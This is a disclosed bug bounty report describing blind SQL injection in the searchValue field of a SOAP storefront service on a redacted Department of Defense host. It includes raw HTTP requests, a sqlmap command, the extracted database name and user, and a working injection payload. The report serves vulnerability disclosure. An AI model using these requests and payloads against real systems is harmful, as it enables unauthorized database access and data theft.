# Blind Sql Injection in https://████████/

## Report Details
- **Report ID**: 2072306
- **URL**: https://hackerone.com/reports/2072306
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-07-17T12:02:12.292Z
- **Disclosed**: 2023-09-08T17:18:14.800Z

## Reporter
- **Username**: hack0neone
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**

first  browse url
https://█████████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/Storefront

find login 

then notice register

████████

███████

click register 

https://████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/RegisterUser

click Choose Facility
█████████

We can see a search box
█████████

```
POST /DSF/webservices/StorefrontService.asmx HTTP/1.1
Host: ████████
Cookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab200041fc059864d60f7079a5bba1c971a9b0ec2c518a8be95c59408233620a4046e908a71691ce11300072991b95acde4750057dcf4b690fc5d287bd05e77fb374c2ef003c7fa6de858098c8aded9cd3dbae4fb2b4cb23fae3f4
Content-Length: 945
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Accept: application/xml
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Soapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://███
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://█████/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0+f1rjakhLYZYEorRbI5CMSxx2CBgN1b
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>
<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>
<TimeOut>20</TimeOut>
<CultureName>zh-CN</CultureName>

      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>
<cultureName>zh-CN</cultureName>
<sortColumn>description</sortColumn>
<sortOrder>asc</sortOrder>
<searchValue>*</searchValue>
<currentPageIndex>1</currentPageIndex>
<recordsToFetch>10</recordsToFetch>

      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>
```

search box exist  Blind Sql Injection

searchValue is  Vulnerability parameters


sqlmap
payload

python2  sqlmap.py -r 11.txt --random-agent --batch --technique=b --dbms=mssql   --force-ssl  --level 3 --skip-urlencode


11.txt is Displayed packets

███



db_name()=dsfdb

user=public\dsfwsuser
████████




## References

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
```
POST /DSF/webservices/StorefrontService.asmx HTTP/1.1
Content-Length: 1002
Host: ███████
Cookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab2000cf04a7295483e1cce16ccb87209e7981813dc0a125020d3f249e89ef86527dcf08fb4cab96113000ae5fba89a9fed5ab8b1354f1c8230167554658dd447c5fc3027504fa66671acba512aa2d0978507583469676a770ea4c
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Accept: application/xml
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Soapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration
Sec-Ch-Ua-Platform: "Windows"
Origin: https://████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://██████/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0 f1rjakhLYZYEorRbI5CMSxx2CBgN1b
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8
Connection: close

      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>
<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>
<TimeOut>20</TimeOut>
<CultureName>zh-CN</CultureName>

      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>
<cultureName>zh-CN</cultureName>
<sortColumn>description</sortColumn>
<sortOrder>asc</sortOrder>
<searchValue>1'  and substring(system_user,1,16)='public\dsfwsuser' and '%'='</searchValue>
<currentPageIndex>1</currentPageIndex>
<recordsToFetch>10</recordsToFetch>

      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>
```

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
